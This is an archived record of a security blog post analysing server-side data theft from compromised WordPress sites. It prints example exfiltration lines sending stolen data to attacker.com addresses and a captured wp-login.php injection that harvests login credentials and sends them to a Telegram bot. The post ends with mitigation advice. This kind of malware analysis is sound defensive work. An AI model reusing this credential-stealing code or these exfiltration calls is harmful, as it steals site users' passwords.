{
    "id": "f7365a15-bd40-417d-9704-60e50bc8e857",
    "created_at": "2023-01-12T15:05:32.16031Z",
    "updated_at": "2025-03-27T02:05:44.260213Z",
    "deleted_at": null,
    "sha1_hash": "37cd9c763f74788d717eab907017f91eab2dcc9a",
    "title": "2021-03-18 - Server Side Data Exfiltration via Telegram API",
    "authors": "",
    "file_creation_date": "2022-05-27T19:08:52Z",
    "file_modification_date": "2022-05-27T19:08:52Z",
    "file_size": 183326,
    "plain_text": "# Sucuri Blog\n\n**[blog.sucuri.net/2021/03/server-side-data-exfiltration-via-telegram-api.html](https://blog.sucuri.net/2021/03/server-side-data-exfiltration-via-telegram-api.html)**\n\nCesar Anjos March 18, 2021\n\nOne of the themes commonly highlighted on this blog includes the many creative methods\nand techniques attackers employ to steal data from compromised websites. Credit card\nskimmers, credential and password hijackers, SQL injections, and even malware on the\nserver level can be used for data exfiltration.\n\nWhat’s more, attackers may be able to accomplish this feat with a few mere lines of code.\nFor example:\n\nEmailing the data:\n```\n@mail(\"email@attacker.com\", $_SERVER[\"SERVER_NAME\"], $stolenData);\n\n```\nWriting the data to a local file:\n```\nfwrite($fh, $stolenData);\n\n```\nSending the data to an email address under the attacker’s control:\n```\n@file_get_contents(\"http://attacker.com/cgi-bin/optimus.pl?prime=$stolenData\");\n\n```\nWriting the data to an image file within the website to avoid raising suspicion:\n```\n$hellowp=fopen('./wp-content/uploads/2018/07/[redacted].jpg','a+');\n$write=fwrite($hellowp,$username_password,$time);\n\n```\n\n-----\n\n## Harvesting & Exfiltrating Stolen Data via Telegram\n\nOne interesting technique our team has come across in recent months leverages the\nTelegram API to exfiltrate stolen data and send it in a private message to a bot under the\nattackers control.\n\nWe recently found the following code injected into wp-login.php on a compromised\nWordPress website.\n```\n$nan = $_POST['log'];\n$pw = $_POST['pwd'];\n$hus = $_SERVER['SERVER_NAME'];\n$loe = $_SERVER['REMOTE_ADDR'];\n$pu = date(\"d-m-Y H:i:s\");\n$fuki = \"\n        hus: $hus\n        nan: $nan\n        pw: $pw\n        pu : $loe\n        wate : $pu\";\n$fuki = wordwrap($fuki, 70);\n//$file = fopen(\"/home/REDACTED/domains/REDACTED.com/public_html/wp-content/a.txt\",\n\"a\");\n//fwrite($file, $fuki);\nfile_get_contents(\"https://api.telegram[.]org/bot1305967562:AAHIKx1E24UCDxFG8wlStrj8qD\nchat_id=1113291041&text=\" . urlencode($fuki));\nwp_redirect($redirect_to);\nexit;\n\n```\nBy injecting this code directly into wp-login.php, the attacker is able to capture login\ncredentials every time a login action is made.\n\nFrom the sample, it’s evident that the original method was writing the stolen data to a file\nnamed “a.txt”. Either this was not a viable long-term solution or the attacker simply got lazy\nand decided to use a different method, because they modified the contents to make a\nrequest to telegram’s API to send a message to their bot instead.\n\nThe attacker uses file_get_contents to make their remote request to Telegram’s API URL,\nallowing them to transmit the stolen data without leaving much evidence of the exfiltration on\nthe server. Adding this feature also allows the attacker to access the stolen data in real-time,\ninstead of having to check a text file for any captured information.\n\nReplicating the request retrieves the following JSON:\n\n\n-----\n\n```\n{\n \"ok\":true,\n \"result\":{\n   \"message_id\":80,\n   \"from\":{\n    \"id\":1305967562,\n    \"is_bot\":true,\n    \"first_name\":\"wp-login\",\n    \"username\":\"wplogin90bot\"\n   },\n   \"chat\":{\n    \"id\":1113291041,\n    \"first_name\":\"hana\",\n    \"last_name\":\"lon turi\",\n    \"type\":\"private\"\n   },\n   \"date\":1602778337,\n   \"text\":\"STOLEN DATA GOES HERE\"\n }\n}\n\n```\nFrom the response request, it’s clear that the stolen data is being transmitted to a bot named\n**wplogin90bot and this is the 80th request sent here. We can also assume that 80 messages**\nhave been successfully sent through these requests — some of which may have contained\nstolen information from compromised websites.\n\n## Conclusion & Mitigation Steps\n\nThe code appears to be evolving, with new features being added to meet the attacker’s\nrequirements. Since it’s still under development, it’s possible that we may continue to see\nexfiltration techniques like this one leverage new functionalities to evade detection while\nsuccessfully harvesting and exfiltrating stolen data.\n\nAttacks like these can be difficult to detect. To mitigate risk and prevent infection in the first\nplace, we strongly encourage website owners to update software with the latest security\n[patches as soon as they become available, follow guidelines for website hardening, and](https://sucuri.net/guides/website-security/)\n[leverage a web application firewall to virtually patch known vulnerabilities.](https://sucuri.net/guides/website-security/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-18 - Server Side Data Exfiltration via Telegram API.pdf"
    ],
    "report_names": [
        "2021-03-18 - Server Side Data Exfiltration via Telegram API.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535932,
    "ts_updated_at": 1743041144,
    "ts_creation_date": 1653678532,
    "ts_modification_date": 1653678532,
    "files": {
        "pdf": "https://archive.orkl.eu/37cd9c763f74788d717eab907017f91eab2dcc9a.pdf",
        "text": "https://archive.orkl.eu/37cd9c763f74788d717eab907017f91eab2dcc9a.txt",
        "img": "https://archive.orkl.eu/37cd9c763f74788d717eab907017f91eab2dcc9a.jpg"
    }
}